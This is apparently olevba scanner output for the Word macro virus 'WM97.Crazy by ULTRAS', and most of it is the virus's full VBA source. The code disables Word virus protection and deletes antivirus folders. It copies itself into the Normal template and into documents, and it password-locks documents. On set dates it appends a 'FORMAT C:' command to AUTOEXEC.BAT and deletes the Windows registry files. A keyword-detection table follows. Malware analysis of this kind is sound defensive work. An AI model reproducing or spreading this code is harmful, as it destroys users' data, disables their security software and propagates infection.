olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ultras.Crazy-a34295a6338cfcb28a1a32970ff584c56bbc825c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ultras.Crazy-a34295a6338cfcb28a1a32970ff584c56bbc825c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Crazy.bas 
in file: Virus.MSWord.Ultras.Crazy-a34295a6338cfcb28a1a32970ff584c56bbc825c - OLE stream: 'Macros/VBA/Crazy'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo Crazy
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Customize...").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
WordBasic.FileSummaryInfo Author:="Crazy by ULTRAS"
Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"
Kill "C:\f-macro\*.*"
Kill "C:\Program Files\McAfee\VirusScan\*.*"
Kill "C:\Program Files\Norton AntiVirus\*.*"
Kill "C:\VDOC\*.*"
Call AutoClose
Call Crazy
Crazy:
End Sub

Sub AutoClose()
On Error GoTo Crazy
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Application.UserName = "ULTRAS"
Application.UserInitials = "Crazy"
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
GlobalInfect = No
DocumentInfect = No
For u = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(u).Name = "Crazy" Then
GlobalInfect = Yes
End If
Next
For w = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(w).Name = "Crazy" Then
DocumentInfect = Yes
End If
Next
If GlobalInfect = No Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Crazy", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocumentInfect = No Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Crazy", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Call Crazy
Crazy:
End Sub

Sub FileSave()
On Error GoTo Crazy
ActiveDocument.Password = "ULTRAS"
ActiveDocument.Save
Crazy:
End Sub

Sub FileSaveAs()
Dialogs(wdDialogFileSaveAs).Show
On Error GoTo Crazy
Set ULTRAS = ActiveDocument.Range(Start:=0, End:=0)
With ULTRAS
.InsertBefore "CRAZY BY ULTRAS"
.Font.Size = 50
.Font.Name = "Impact"
.Font.ColorIndex = 3
.Font.Shadow = 1
.Font.Animation = 2
End With
Crazy:
End Sub

Sub Crazy()
On Error GoTo Crazy
If Day(Now()) = 5 Then
MsgBox "You Infected WM97.Crazy by ULTRAS", vbCritical + vbOKOnly, "ULTRAS"
ActiveDocument.Password = "Crazy"
ActiveDocument.Save
End If
If Day(Now()) = 19 Then
Open "C:\AUTOEXEC.BAT" For Input As #1
Close
SetAttr "C:\AUTOEXEC.BAT", vbNormal
Open "C:\AUTOEXEC.BAT" For Append As #1
Print #1, "@ECHO OFF"
Print #1, "CLS"
Print #1, "ECHO Please wait..."
Print #1, "FORMAT C: /U /C /S /AUTOTEST > NUL"
Close #1
SetAttr "C:\AUTOEXEC.BAT", vbReadOnly
End If
If Day(Now()) = 27 Then
MsgBox "You Infected WM97.Crazy by ULTRAS", vbCritical + vbOKOnly, "ULTRAS"
SetAttr "C:\Windows\user.da0", 0
Kill "C:\Windows\user.da0"
SetAttr "C:\Windows\system.da0", 0
Kill "C:\Windows\system.da0"
SetAttr "C:\Windows\user.dat", 0
Kill "C:\Windows\user.dat"
SetAttr "C:\Windows\system.dat", 0
Kill "C:\Windows\system.dat"
End If
Crazy:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

